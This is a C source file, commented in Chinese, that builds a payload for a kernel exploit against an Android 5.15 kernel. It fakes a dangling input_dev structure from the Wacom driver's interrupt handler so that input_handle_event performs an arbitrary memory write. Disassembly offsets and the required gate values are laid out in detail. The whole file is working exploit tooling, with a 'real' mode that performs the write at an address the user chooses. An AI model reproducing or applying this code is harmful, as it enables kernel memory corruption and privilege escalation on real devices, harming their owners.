/*
 * payload_build2: 99491 写原语 payload 构造器（门禁链已全部 objdump 核对）
 *
 * 反汇编依据（本机 5.15.194-android13-8-gbe719f564aac）：
 *   wacom_wac_irq @ 0xffffffc0092c0a64
 *     +0058 ldr x20,[x27,#800]    x20 = wacom_wac->input (悬垂 input_dev)
 *     +0134 ldrh w22,[x27,#258]   value = *(u16*)(wacom_wac+258)
 *     +0138 ldr  x8,[x20,#40]     x8 = evbit[0]           <- 0x028
 *     +013c tbz  w8,#3, skip      若 bit3==0 则根本不调用
 *     +0154 mov  w1,#3            type = EV_ABS
 *     +0158 mov  w2,wzr           code = 0
 *     +015c mov  w3,w22           value
 *
 *   input_handle_event @ 0xffffffc009147304
 *     +0024 ldrb w8,[x19,#1432]   0x598 必须 0
 *     +0038 cmp  w1,#3            type==EV_ABS
 *     +0040 cmp  w20,#0x3f        code<=63
 *     +0048 ldr  x8,[x19,#152]    absbit[0]               <- 0x098
 *     +0050 tbz  w8,#0, skip      bit0 必须 1
 *     +0054 ldr  x8,[x19,#320]    grab/evdev 指针         <- 0x140
 *     +0070 cbnz x8, ->0x7634     ★ 非 0 则走 evdev 分支，vals 写入被跳过
 *     +0074 mov  w23,#1           允许记录 vals
 *     +03a8 ldr  x8,[x19,#1392]   vals                    <- 0x570
 *     +03ac cbz  x8, ret          vals==0 不写
 *     +03c0 add  x8,x8,x9,lsl#3   x8 = vals + num_vals*8
 *     +03c8 strh w21,[x8]         type
 *     +03cc strh w20,[x8,#2]      code
 *     +03d0 str  w22,[x8,#4]      value
 *
 * 用法:
 *   payload_build2 <mode> <vals_hex> [outfile]
 *     mode = guard : 0x598=0xFF        -> 第一步就返回，绝不写
 *     mode = noval : vals=0, 0x598=0   -> 走到 vals 检查，cbz 返回，不写
 *     mode = real  : vals=<addr>, 0x598=0 -> 真写
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PAYLOAD_SIZE 1728
#define OFF_EV0     0x028
#define OFF_ABS0    0x098
#define OFF_P140    0x140
#define OFF_P148    0x148
#define OFF_NUMV    0x568
#define OFF_MAXV    0x56c
#define OFF_VALS    0x570
#define OFF_GUARD   0x598

static void w64(unsigned char *b, size_t off, unsigned long long v) {
    memcpy(b + off, &v, 8);
}
static void w32(unsigned char *b, size_t off, unsigned int v) {
    memcpy(b + off, &v, 4);
}
static unsigned long long r64(unsigned char *b, size_t off) {
    unsigned long long v;
    memcpy(&v, b + off, 8);
    return v;
}
static unsigned int r32(unsigned char *b, size_t off) {
    unsigned int v;
    memcpy(&v, b + off, 4);
    return v;
}

int main(int argc, char **argv) {
    const char *mode = argc > 1 ? argv[1] : "guard";
    unsigned long long vals = 0;
    const char *out = argc > 3 ? argv[3] : "/data/local/tmp/payload.bin";

    if (argc > 2) vals = strtoull(argv[2], NULL, 0);

    static unsigned char buf[PAYLOAD_SIZE];
    memset(buf, 0, sizeof(buf));

    /* ★ evbit bit3 = EV_ABS，缺这条就完全不触发 */
    w64(buf, OFF_EV0, 0x8ULL);
    /* ★ absbit bit0（code=0） */
    w64(buf, OFF_ABS0, 0x1ULL);
    /* ★ 0x140 / 0x148 保持 0：memset 已保证 */

    w32(buf, OFF_NUMV, 0);
    w32(buf, OFF_MAXV, 1);

    if (!strcmp(mode, "noval")) {
        vals = 0;
    }
    w64(buf, OFF_VALS, vals);

    buf[OFF_GUARD] = strcmp(mode, "guard") ? 0x00 : 0xFF;

    /* 自检 */
    printf("=== payload_build2 ===\n");
    printf("  mode      = %s\n", mode);
    printf("  size      = %d\n", PAYLOAD_SIZE);
    printf("  0x028 evbit[0] = 0x%llx  (bit3=%d)\n",
           r64(buf, OFF_EV0), (int)((r64(buf, OFF_EV0) >> 3) & 1));
    printf("  0x098 absbit[0]= 0x%llx  (bit0=%d)\n",
           r64(buf, OFF_ABS0), (int)(r64(buf, OFF_ABS0) & 1));
    printf("  0x140 ptr     = 0x%llx  (必须 0)\n", r64(buf, OFF_P140));
    printf("  0x148 absinfo = 0x%llx  (必须 0)\n", r64(buf, OFF_P148));
    printf("  0x568 num_vals= %u\n", r32(buf, OFF_NUMV));
    printf("  0x56c max_vals= %u\n", r32(buf, OFF_MAXV));
    printf("  0x570 vals    = 0x%016llx %s\n", r64(buf, OFF_VALS),
           r64(buf, OFF_VALS) ? "(会写!)" : "(cbz 返回, 不写)");
    printf("  0x598 guard   = 0x%02x %s\n", buf[OFF_GUARD],
           buf[OFF_GUARD] ? "(立即返回)" : "(会继续)");

    FILE *f = fopen(out, "wb");
    if (!f) { perror("open"); return 2; }
    if (fwrite(buf, 1, sizeof(buf), f) != sizeof(buf)) { fclose(f); return 3; }
    fclose(f);
    printf("  out = %s\n", out);
    return 0;
}